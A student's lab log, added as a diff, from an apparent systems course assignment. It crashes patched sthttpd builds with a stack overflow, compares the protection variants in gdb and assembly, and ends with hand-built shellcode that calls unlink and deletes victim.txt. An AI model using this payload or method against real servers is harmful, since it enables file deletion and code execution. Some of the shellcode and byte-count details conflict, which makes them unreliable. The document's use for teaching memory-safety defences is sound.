@@ -1,0 +1,424 @@
+Khoi Nguyen
+
+smashinglab.txt
+
+First, to bring the tar file over to the linux server:
+wget http://web.cs.ucla.edu/classes/fall18/cs33/lab/sthttpd-2.27.0.tar.gz
+
+To unzip that file:
+tar -xvzf sthttpd-2.27.0.tar.gz
+
+Next I went into the unzipped directory and
+copy and pasted the patch into a newly created patch file:
+cd sthttpd-2.27.0
+vim patch_file.diff (copy and paste)
+
+To apply the patch, I used:
+patch -p1 < patch_file.diff
+
+--------------(Steps to illustrate and defend against bug)
+
+1) To make sure I had the right gcc version and had the right path prepended:
+echo $PATH
+which gcc
+
+To prepend the path:
+export PATH=/usr/local/cs/bin:$PATH
+
+2) Next we build after the patch has been applied using:
+./configure \
+   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+We need to compile it 3 seperate times with the following options:
+
+(SP) Strong stack protection:
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+mv src/thttpd src/thttpd-sp
+
+(AS) Address sanitation
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+mv src/thttpd src/thttpd-as
+
+(NO) Neither
+make clean
+make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+mv src/thttpd src/thttpd-no
+
+We need to make a test file for the next steps inside the main directory
+for the next steps:
+nano foo.txt
+
+Inside foo.txt is 
+"Hello My Name 
+Is Khoi
+Nguyen!"
+
+3./4. Next we run each of the daemons under GDB with a specified port
+	port numbers for each option
+	SP	12886	
+	AS	12887
+	NO	12888
+
+commands to run:
+
+src/thttpd-sp -p 12886 -D
+*in a seperate terminal
+curl http://localhost:12886/foo.txt
+
+src/thttpd-as -p 12887 -D
+*in a seperate terminal
+curl http://localhost:12887/foo.txt
+
+src/thttpd-no -p 12888 -D
+*in a seperate terminal
+curl http://localhost:12888/foo.txt
+
+For each of the commands, the output is correct with 
+the out put of:
+Hello My Name 
+Is Khoi
+Nguyen!
+
+5. The bug in the program is that the character buffer is
+only limited to 100 characters and must be a word form the 
+switch statement in the read_config function of thttpd.c. 
+Because of that knowledge we can force the program to crash 
+by having a file larger than 100 characters. 
+nano foo2.txt (copy paste "debug" multiple times) 
+
+To make the SP variant crash we first need to run it in gdb:
+gdb src/thttpd-sp
+(gdb) run -p 12886 -D -C foo2.txt
+
+The output was:
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+*** stack smashing detected ***: /w/home.11/ce/ugrad/nguyenk/cs33/smashing-lab/sthttpd-2.27.0/src/thttpd-sp terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+
+(gdb) bt
+
+output:
+#0  0x00007ffff6da50b8 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6da5fb9 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e3ba6 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7647ce4 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76e7677 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76e7632 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000404165 in read_config (filename=<optimized out>) at thttpd.c:1129
+#7  0x7562656400677562 in ?? ()
+#8  0x0067756265640067 in ?? ()
+#9  0x6564006775626564 in ?? ()
+#10 0x7562656400677562 in ?? ()
+#11 0x0067756265640067 in ?? ()
+#12 0x6564006775626564 in ?? ()
+#13 0x7562656400677562 in ?? ()
+#14 0x0067756265640067 in ?? ()
+#15 0x0000000000402900 in fork@plt ()
+#16 0x000000000000000a in ?? ()
+#17 0x0000000000000000 in ?? ()
+
+From this, the line that stod out to me was line #6, where it states
+where the error in thttpd.c is, thus I ran:
+(gdb) b read_config
+(gdb) run -p 12886 -D -C foo2.txt
+(gdb) next
+*keep running next until the program crashes to see the exact line of crash
+
+The last line before the stack smashing is printed is:
+1189	    (void) fclose( fp );
+
+Thus I put another breakpoint at that line to be able to step in:
+(gdb) b 1189
+(gdb) run -p 12886 -D -C foo2.txt
+(gdb) set disassemble-next-line on
+(gdb) si
+(gdb) ni
+
+The lines that causes the jumps to the stack smashing message, is 
+the following command:
+0x0000000000404052 <read_config+1154>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+0x000000000040405b <read_config+1163>:	0f 85 ff 00 00 00	jne    0x404160 <read_config+1424>
+
+Because strong stack protection is on, this command compares canary
+values. If the two values are unequal, then there is an overflow
+in the stack buffer, which is exactly what has happened with a large
+foo2.txt file. The line after is a jump command since the xor was not 
+equal, thus jumping to the corresponding action.
+
+6. To run the AS variant:
+gdb src/thttpd-as
+(gdb) run -p 12887 -D -C foo2.txt
+
+The error that apppeared was:
+==14067==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcbb4 at pc 0x00000048a72c bp 0x7fffffffcb10 sp 0x7fffffffc2c0
+READ of size 217 at 0x7fffffffcbb4 thread T0
+
+#0 0x48a72b in __interceptor_strchr ../../../../gcc-8.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:618
+#1 0x50b6dd in read_config /u/ce/ugrad/nguyenk/cs33/smashing-lab/sthttpd-2.27.0/src/thttpd.c:1018
+#2 0x50c1ff in parse_args /u/ce/ugrad/nguyenk/cs33/smashing-lab/sthttpd-2.27.0/src/thttpd.c:893
+#3 0x40680b in main /u/ce/ugrad/nguyenk/cs33/smashing-lab/sthttpd-2.27.0/src/thttpd.c:380
+#4 0x7ffff6cb93d4 in __libc_start_main (/lib64/libc.so.6+0x223d4)
+#5 0x407a59  (/w/home.11/ce/ugrad/nguyenk/cs33/smashing-lab/sthttpd-2.27.0/src/thttpd-as+0x407a59)
+
+The program ended in an abort so I couldn't backtrace, however I noticed that the last error in 
+thttpd.c is on line 1018, thus I set a breakpoint near there
+
+next commands:
+(gdb) b 1016
+(gdb) run -p 12887 -D -C foo2.txt
+(gdb) set disassemble-next-line on
+(gdb) si
+(gdb) ni
+
+From these commands, I figured that the following code caused the crash:
+0x000000000050b6d9 <read_config+185>:	e8 e2 f2 f7 ff	callq  0x48a9c0 <__interceptor_strchr(char const*, int)>
+
+The function __interceptor_strchr is called as a result of the 
+function trying to access shadow memory, or unaccessable memory.
+Because Address Sanitation is turned on, Address Sanitation checks
+if whether or not certain memory is safe to access. Because foo2.txt
+is longer than the max amount of characters, the program access
+unaccessable memory, thus outputting an error.
+
+7. To run the NO variant:
+gdb src/thttpd-no
+(gdb) run -p 12888 -D -C foo2.txt
+
+The output is:
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
+1189	    (void) fclose( fp );
+
+Next command:
+(gdb) bt
+
+The output is:
+#0  0x0000000000403f79 in read_config (filename=<optimized out>) at thttpd.c:1189
+#1  0x7562656400677562 in ?? ()
+#2  0x0067756265640067 in ?? ()
+#3  0x6564006775626564 in ?? ()
+#4  0x7562656400677562 in ?? ()
+#5  0x0067756265640067 in ?? ()
+#6  0x6564006775626564 in ?? ()
+#7  0x7562656400677562 in ?? ()
+#8  0x0067756265640067 in ?? ()
+#9  0x0000000000402900 in ?? ()
+#10 0x000000000000000a in ?? ()
+#11 0x0000000000000000 in ?? ()
+
+We see an error in thttpd.c at line 1189, thus we set a breakpoint there:
+
+(gdb) b 1189
+(gdb) run -p 12888 -D -C foo2.txt
+(gdb) set disassemble-next-line on
+(gdb) si
+
+Before the segmentation fault, this was the previous assembly code:
+1189	    (void) fclose( fp );
+   0x0000000000403f65 <read_config+1125>:	4c 89 f7	mov    %r14,%rdi
+   0x0000000000403f68 <read_config+1128>:	e8 b3 e3 ff ff	callq  0x402320 <fclose@plt>
+   0x0000000000403f6d <read_config+1133>:	48 83 c4 70	add    $0x70,%rsp
+   0x0000000000403f71 <read_config+1137>:	5b	pop    %rbx
+   0x0000000000403f72 <read_config+1138>:	5d	pop    %rbp
+   0x0000000000403f73 <read_config+1139>:	41 5c	pop    %r12
+   0x0000000000403f75 <read_config+1141>:	41 5d	pop    %r13
+   0x0000000000403f77 <read_config+1143>:	41 5e	pop    %r14
+=> 0x0000000000403f79 <read_config+1145>:	c3	retq   
+(gdb) 
+
+Here shows that the program tried returning, however nowhere in the program
+was a check for overflow in the buffer. Since foo2.txt was longer than allowed
+the return address was overwritten. The segmentation fault was thrown because
+the program tried to execute code that was not executeable which was the return
+address.
+
+8. Commands to run to get the assembly code for each variant:
+
+For (SP):
+gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
+For (AS):
+gcc -S -O2 -fno-inline -static-libasan -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
+For (NO):
+gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s
+
+I compiled with the given flags. -I indicates where the header files can be located. I ran
+these commands inside the src directory. 
+
+Looking into the assembly code of the (NO) and (SP) variant, the
+assembly code for the handle_read functions are identical. The 
+only difference, although plays no functional difference,
+is the local labels (ex. .L386 vs .L376). Strong stack protection
+does not compare the canary values inside the handle_read function
+and instead compares in the read_config function.
+
+As for the (AS) variant, the check for overflow in the input is
+inside the handle_read function. It checks if the program has accessed
+shadow memory. If it has then it will call either __asan_report_loadX or
+__asan_report_storeX where x is either 4 or 8. The two functions will 
+output the error as noted in section 6. Just one example of this check is
+the following:
+
+.L1165:
+       	leaq    200(%rbp), %rdi
+        movq    %rdi, %rax
+        shrq    $3, %rax
+        cmpb    $0, 2147450880(%rax)
+        jne     .L1171
+        movq    200(%rbp), %rsi
+        jmp     .L1061
+
+.L1171:
+       	call    __asan_report_load8
+
+The shadow memories are found by shifting right by 3 and adding the address
+with the offset. If the shadow memory is accessed, the the program jumps
+to .L1171 to call the error.
+
+9) First, we need to the address of line and the return address of %rsp.
+We do this by running gdb again:
+
+gdb src/thttpd-no
+(gdb) b read_config
+(gdb) run -p 12888 -D -C foo2.txt
+(gdb) p &line
+
+output:
+$1 = (char (*)[100]) 0x7fffffffccf0
+
+more commands:
+(gdb) info r
+
+output:
+rax            0x5	5
+rbx            0x7fffffffe372	140737488348018
+rcx            0x0	0
+rdx            0x2	2
+rsi            0x7fffffffe375	140737488348021
+rdi            0x7fffffffe375	140737488348021
+rbp            0x5	0x5
+rsp            0x7fffffffcd88	0x7fffffffcd88
+r8             0xffff	65535
+r9             0xc	12
+r10            0xffffffffffffffcc	-52
+r11            0x7ffff770d680	140737344755328
+r12            0x40ef86	4255622
+r13            0x6	6
+r14            0x7fffffffe028	140737488347176
+r15            0x5	5
+rip            0x403b00	0x403b00 <read_config>
+eflags         0x297	[ CF PF AF SF IF ]
+cs             0x33	51
+ss             0x2b	43
+ds             0x0	0
+es             0x0	0
+fs             0x0	0
+
+From this we learn that the address of where the input file is stored is
+0x7fffffffccf0
+and the address of return is 
+0x7fffffffcd88
+difference between the two addresses:152
+
+Next, we need to find hex value of "victim.txt"
+
+I wrote a program in a file named victimHex.c:
+void main()
+{
+        char text[11]="victim.txt";
+}
+
+commands to read assembly code:
+gcc -c -o victimHex victimHex.c
+objdump -d victimHex
+
+the output:
+0000000000000000 <main>:
+   0:	55                   	push   %rbp
+   1:	48 89 e5             	mov    %rsp,%rbp
+   4:	48 b8 76 69 63 74 69 	movabs $0x742e6d6974636976,%rax
+   b:	6d 2e 74 
+   e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
+  12:	66 c7 45 f8 78 74    	movw   $0x7478,-0x8(%rbp)
+  18:	c6 45 fa 00          	movb   $0x0,-0x6(%rbp)
+  1c:	5d                   	pop    %rbp
+  1d:	c3                   	retq  
+
+From this, we can tell that the hex code of "victim.txt" is 
+76 69 63 74 69 6d 2e 74 78 74 0a
+
+I have not quit gdb yet so the next command in gdb is :
+(gdb) disas /r unlink
+
+Dump of assembler code for function unlink:
+   0x00007ffff76c03a0 <+0>:	b8 57 00 00 00	mov    $0x57,%eax
+   0x00007ffff76c03a5 <+5>:	0f 05	syscall 
+   0x00007ffff76c03a7 <+7>:	48 3d 01 f0 ff ff	cmp    $0xfffffffffffff001,%rax
+   0x00007ffff76c03ad <+13>:	73 01	jae    0x7ffff76c03b0 <unlink+16>
+   0x00007ffff76c03af <+15>:	c3	retq   
+   0x00007ffff76c03b0 <+16>:	48 8b 0d b9 4a 2d 00	mov    0x2d4ab9(%rip),%rcx        # 0x7ffff7994e70
+   0x00007ffff76c03b7 <+23>:	f7 d8	neg    %eax
+   0x00007ffff76c03b9 <+25>:	64 89 01	mov    %eax,%fs:(%rcx)
+   0x00007ffff76c03bc <+28>:	48 83 c8 ff	or     $0xffffffffffffffff,%rax
+   0x00007ffff76c03c0 <+32>:	c3	retq  
+
+From this, we see that 87 is put into %rax and syscall is then called. We need to 
+now find the hex code that we can use to exploit:
+
+
+Inside a file I made called unlink.s I put:
+movq    0x7fffffffcd78, %rax
+movq    $0x57,%rax
+syscall
+
+The 0x7fffffffcd78 comes from 0x7fffffffcd88 - 11 bytes(from "victim.txt") -5 
+
+commands:
+gcc -c unlink.s
+objdump -d unlink.o
+
+output:
+unlink.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+ 0:	48 a1 78 cd ff ff ff 	movabs 0x7fffffffcd78,%rax
+   7:	7f 00 00 
+   a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax
+  11:	0f 05   
+
+From this we have the beginning of our hex code:
+48 a1 78 cd ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+This is 19 bytes, "victim.txt" is 16 bytes, and the 
+difference between the addresses is 152 bytes, we add
+117 junk bytes. The final hex code we add is the address
+of rsp. We also reserve 5 bytes to the front to hold for
+"port=" which I will be using in the exploit.txt file.
+
+The final hex code:
+00 00 00 48 a1 78 cd ff ff ff 7f 00 00 48 c7 c0 57
+00 00 00 0f 05 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00	00 00 00 00 00 00 00 00	00
+00 00 00 00 00 00 00 00	00 00 00 00 00 00 00 00	00
+00 00 00 00 00 00 00 00	00 00 00 00 00 00 00 00	00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 76 69 63 74 69  
+6d 2e 74 78 74 00 00 00 00 00 00 f8 cc ff ff ff 7f 00 00
+
+I pasted that into hex.txt, ran the command:
+xxd -r -p hex.txt > exploit.txt
+
+added port= to exploit.txt.
+
+Now we can finally test:
+gdb sthttpd-2.27.0/src/thttpd-no
+(gdb) run -p 12888 -D -C exploit.txt
+
+The victim.txt I made at the beginning of this assignment has
+be deleted. 
